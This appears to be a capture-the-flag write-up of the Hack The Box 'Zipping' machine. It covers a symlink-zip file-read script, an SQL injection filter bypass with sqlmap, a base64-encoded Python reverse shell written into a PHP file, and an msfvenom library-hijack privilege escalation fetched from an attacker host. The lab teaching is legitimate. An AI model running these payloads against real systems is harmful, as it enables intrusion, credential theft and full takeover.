---
layout: post
title: HTB Zipping Writeup  
subtitle: Medium Linux Box
thumbnail-img: /assets/img/zipping/zipping.png
tags: [HTB]
---

| Name | Zipping |
| :------ |:--- |
| OS | Linux |
| DIFFICULTY | Medium |

## Port Scan
To kick off my exploration of the machine, I consistently begin with an `nmap` scan to pinpoint open ports. I opt for a two-step scanning approach: the first involves a swift scan across all ports, and the second comprises a more thorough investigation of ports identified as open in the initial scan.

The findings indicate that TCP ports 22 and 80 are accessible, with 22 hosting an SSH service and 80 supporting an Apache web server.
```
nmap -p- --min-rate=1000 -oN allPorts.nmap 10.10.11.229
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

nmap -p 22,80 -sVC -oN scriptScan.nmap 10.10.11.229
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## TCP/22
The `nmap` scan effectively detected the presence of `OpenSSH 9.0p1` running on port 22. Given that SSH typically maintains a limited attack surface, my enumeration of SSH will be relatively light. A swift search for `OpenSSH 9.0p1` on [launchpad](https://launchpad.net/ubuntu/+source/openssh/1:9.0p1-1ubuntu8.5) reveals that it was last updated on August 24, 2023. At the time this box was released, it appears to be a fairly up-to-date package without known vulnerabilities. Engaging in brute-force attempts for SSH credentials is generally not very effective in this context.

## TCP/80
In contrast to SSH, websites typically present a more intricate attack surface. When targeting websites, my approach involves gaining a comprehensive understanding of the application—its functionalities, underlying technologies, and more.

Upon examining this site, it appears to be predominantly static, offering limited opportunities for interaction. Many links are broken or redirect to the main page. Nevertheless, three pages stood out as dynamic: "Contact Us," "Shop," and "Work With Us."

The `/shop` page revealed an online store. Analyzing the URL, I identified a Local File Inclusion (LFI) vulnerability in the `page` parameter. However, this vulnerability exhibited some constraints, preventing me from reading system files such as `/etc/passwd`. The screenshot below illustrates my traversal to the upload page within the application.
![zipping](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zipping/3.png)

The `/upload` section prompts users to submit a zip file containing a PDF file. My attempt to upload a PHP reverse shell was thwarted by a check ensuring that the zip file exclusively contained a PDF. However, an intriguing attack avenue involves the use of symlinks, or Symbolic Links—a type of shortcut to another file.

In this scenario, we can create a malicious PDF that incorporates a symlink pointing to a sensitive file, such as `/etc/passwd`. After zipping this file, submitting it to the page, and having the application unzip it, the symlink will lead to the display of the contents of `/etc/passwd."

Let's delve into the exploitation process:
```
sudo ln -s /etc/passwd zon.pdf
zip --symlink zon.zip zon.pdf
```

Upload the file to `/upload.php` and take note of where it gets uploaded to:
![zipping](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zipping/1.png)

Using `curl` we can see the contents of the page, which are `/etc/passwd`, because of the symlink. 
```
curl -v 'http://10.10.11.229/uploads/76bdaf66a25127acf651b97d9fda8f7a/zon.pdf'                                                                                                                        [43/249]
*   Trying 10.10.11.229:80...                                                 
* Connected to 10.10.11.229 (10.10.11.229) port 80 (#0)                       
> GET /uploads/76bdaf66a25127acf651b97d9fda8f7a/zon.pdf HTTP/1.1
> Host: 10.10.11.229                                                          
> User-Agent: curl/7.88.1              
> Accept: */*                                                                                                                                                                                
>                                                                                                                                                            
< HTTP/1.1 200 OK                                                             
< Date: Mon, 15 Jan 2024 05:51:39 GMT
< Server: Apache/2.4.54 (Ubuntu)                                              
< Last-Modified: Mon, 15 Jan 2024 05:51:28 GMT                                                           
< ETag: "56d-60ef59adf178a"                                                                   
< Accept-Ranges: bytes                                                        
< Content-Length: 1389                                                        
< Content-Type: application/pdf                                               
<                                                                             
root:x:0:0:root:/root:/bin/bash                                               
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                                                              
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                          
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                          
sync:x:4:65534:sync:/bin:/bin/sync                                            
games:x:5:60:games:/usr/games:/usr/sbin/nologin                               
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                          
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                             
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                              
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                        
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                      
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                               
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                     
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                     
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                            
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin                                                             
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                               
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin                                                         
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin                                                                                                                            
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin                                                                                                                         
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin                                                     
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin                             
pollinate:x:105:1::/var/cache/pollinate:/bin/false                                                       
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin                                                            
rektsu:x:1001:1001::/home/rektsu:/bin/bash                                                               
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

Streamlining this process on the file system manually can be time-consuming. To enhance efficiency, I followed a video tutorial by 0xdf and developed a Python script to automate the entire procedure. This approach is particularly advantageous as the symlink doesn't need to physically exist on the disk. Consequently, there's no need to generate numerous files on our host to create symlinks to the PDF file.
```python
#!/usr/bin/env/python3

import sys
import io
import zipfile
import requests
import re

# Make sure we have enough arguments, namly the file to view
if len(sys.argv) != 2:
    print("Usage: %s <fileToView>" % sys.argv[0])
    sys.exit(1)

# Set host to zipping and file to view to the first argument e.g. python3 zipping.py /etc/passwd
host = "10.10.11.229"
fileToView = sys.argv[1]

# This lets us save our zip file that contains the pdf to memory rather than to disk
buffer = io.BytesIO()

# Puts the attributes and name into the buffer as a zip file
with zipfile.ZipFile(buffer, "w") as myZipFile:
    zipInfo = zipfile.ZipInfo('zon.pdf')
    zipInfo.create_system = 3
    zipInfo.external_attr |= 0xA0000000
    myZipFile.writestr(zipInfo, fileToView)

# This is a tuple that contains the name of the file, the buffer and the content type
files = ('zon.zip', buffer.getbuffer(), {"Content-Type": "application/zip"})

# We then send the zip file to the host
resp = requests.post(f'http://{host}/upload.php',
              files={"zipFile": ('zon.zip', buffer.getbuffer(), {"Content-Type": "application/zip"})},
              data={"submit": ""}
              )

# Parse out the upload path
(url, ) = re.findall(r'path:</p><a href="(.*)">\1</a>', resp.text)

# Send a get request to the host with the url of the the malicious symlink to get the contents 
resp = requests.get(f'http://{host}/{url}')
sys.stdout.buffer.write(resp.content)
```

Running the script I can see the hostname of the machine, proving that this works.
```bash
python3 zipping.py /etc/hostname
zipping
```

In our reconnaissance phase, we identified that the webserver is running Apache2. To gain insights into the file system structure of the application, I examined the configuration files. The output indicates that this site is hosted from `/var/www/html` and includes a `/uploads` directory.
```
python3 zipping.py /etc/apache2/sites-available/000-default.conf
[snip]
ServerAdmin webmaster@localhost 
DocumentRoot /var/www/html
     <Directory /var/www/html/uploads>
            Options -Indexes
     </Directory>
```

Upon revisiting the gathered information, three noteworthy pages emerged: "Contact Us" at the root `/`, "Shop" at `/shop`, and "Work With Us" at `/upload.php`. While the root page `/index.php` contained HTML content, the home page of the Shop, specifically `/shop/index.php`, revealed PHP code. This code shed light on the reason why the directory traversal only proved effective on certain files—it systematically appends `.php` to the end of every page.
```php
python3 zipping.py /var/www/html/shop/index.php

<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

On this page, functions from `functions.php` are incorporated, and it invokes `pdo_connect_mysql()` to establish a MySQL connection. The distinctive feature here is the automatic appending of `.php` to the end of each page.

To gain further insight, it's crucial to examine the content of `functions.php`, a file included within `index.php`. Notably, the function `pdo_connect_mysql()` is not a standard PHP function, prompting a closer examination of its implementation.
```php
<?php                                                                         
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';                                             
    $DATABASE_USER = 'root';                                                                                                                                 
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';                                                                                                                      
    $DATABASE_NAME = 'zipping';                                               
    try {             
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) { 
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
    }
}                 
// Template header, feel free to customize this
function template_header($title) {
$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;
echo <<<EOT
```

Taking a closer look at the `functions.php` file, it becomes apparent that it contains credentials for the database—information that could prove valuable for later stages.

Furthermore, within the Shop, there's a `product.php` page that I managed to uncover. This particular page is responsible for showcasing various products. Exploring its contents could potentially yield additional insights into the application's functionality and structure.
![zipping](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/zipping/2.png)

Employing our script to inspect the source code, it becomes evident that the script takes the `id` parameter from the URL and applies it to a `preg_match` for filtering. Should it discover a match, a simple redirection occurs. Conversely, if it successfully passes the filter, the `id` is then utilized in a `prepare` statement to execute an SQL query. Understanding this process is pivotal for comprehending how input is handled and processed within the application.
```php
// Check to make sure the id parameter is specified in the URL                                                                                               
if (isset($_GET['id'])) {                                                                                                                                    
    $id = $_GET['id'];                                                                                                                                       
    // Filtering user input for letters or special characters                                                                                                
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {                                                                
        header('Location: index.php');                                                                                                                       
    } else {                                                                                                                                                 
        // Prepare statement and execute, but does not prevent SQL injection                                                                                 
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");                                                                                    
        $stmt->execute();                                                                                                                                    
        // Fetch the product from the database and return the result as an Array                                                                             
        $product = $stmt->fetch(PDO::FETCH_ASSOC);                                                                                                           
        // Check if the product exists (array is not empty)                                                                                                  
        if (!$product) {                                                                                                                                     
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }   
```

The `id` parameter in the `product.php` page is susceptible to exploitation. The `preg_match` function employed three criteria for filtering:

1. **Letters and symbols:** `^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\`
2. **Special characters:** `;:'\",.<>\/?]`
3. **Must end with an integer:** `[^0-9]$`

An important observation was that `preg_match` did not use the `/m` modifier, which considers multiple lines. This allowed the injection of encoded line returns (`%0D%0A` for `\r\n`) to bypass the letter, symbol, and special character filters, provided it concluded with a number.

To exploit this vulnerability, `sqlmap` was utilized with the ability to specify a prefix and a suffix. The command used was:
`sqlmap 'http://10.10.11.229/shop/index.php?page=product&id=2' --batch -p id --prefix "%0D%0A'" --suffix="'1" --level 2 --flush-session --sql-shell`

This uncovered two significant vulnerabilities that could be chained together. Leveraging the earlier discovered Local File Inclusion (LFI), it became possible to write files to the file system using the SQL shell. Subsequently, the LFI was employed to execute the written PHP code. Given the application's PHP runtime, the injected PHP code included a reverse connection mechanism to establish a connection back to the attacker's machine using Python3. To account for the trailing `'1` appended to the filename during the SQL injection, a null byte (`%00`) was introduced to eliminate this suffix.
```
select '<?php system(''echo ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNC41IjtleHBvcnQgUlBPUlQ9OTAwMTtweXRob24zIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJw==|base64 -d|bash''); ?>' INTO OUTFILE '/var/lib/mysql/shell.php%00';
```

Upon establishing a listener and navigating to `10.10.11.229/shop/index.php?page=/var/lib/mysql/shell`, a shell is successfully obtained. This demonstrates the successful exploitation of the combined vulnerabilities, allowing for the execution of arbitrary code on the target system.
```
┌──(kali㉿kali)-[~/htb/zipping]                                               
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.229] 48532
$ ls
ls    
assets    functions.php  index.php       product.php
cart.php  home.php       placeorder.php  products.php
```

## Root

My initial investigation focused on the user's `sudo` privileges. It appears that the user has permission to run `/usr/bin/stock` without entering a password:
```
rektsu@zipping:~$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Since `/usr/bin/stock` is a non-standard binary, my next step was to conduct basic reverse engineering. Attempting to run it prompts for a password, and using the `strings` command, I discovered the hardcoded password within the binary:
```
rektsu@zipping:~$  sudo /usr/bin/stock
Enter the password: 
Invalid password, please try again.


strings /usr/bin/stock
[snip]
St0ckM4nager
[snip]
```

To better understand the binary's behavior, I employed `strace` and identified an attempt to load a non-existent library (`libcounter.so`) from the user's home directory:
```
strace /usr/bin/stock
[snip]

write(1, "Enter the password: ", 20Enter the password: )    = 20

read(0, St0ckM4nager

"St0ckM4nager\n", 1024)         = 13

openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
              
```

Exploiting this behavior, I created a malicious library that, when loaded with sudo privileges, adds the SUID bit to `/bin/bash`:
```
msfvenom -p linux/x64/exec CMD='chmod +s /bin/bash' -f elf-so -o libcounter.so
```

After setting up a Python web server, I downloaded and saved the library to `/home/rektsu/.config`, ensuring it would be loaded when executing the binary with root privileges:
```
rektsu@zipping:~/.config$ wget 10.10.14.2/libcounter.so
```

Upon running `/usr/bin/stock` with sudo privileges, I confirmed that the SUID bit had been added to `/bin/bash`, enabling root access:
```
rektsu@zipping:~/.config$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

rektsu@zipping:~/.config$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1433736 Oct  7  2022 /bin/bash
```

Executing `/bin/bash -p` granted me root access:
```
rektsu@zipping:~/.config$ /bin/bash -p
bash-5.2# id
uid=1001(rektsu) gid=1001(rektsu) euid=0(root) egid=0(root) groups=0(root),1001(rektsu)
```
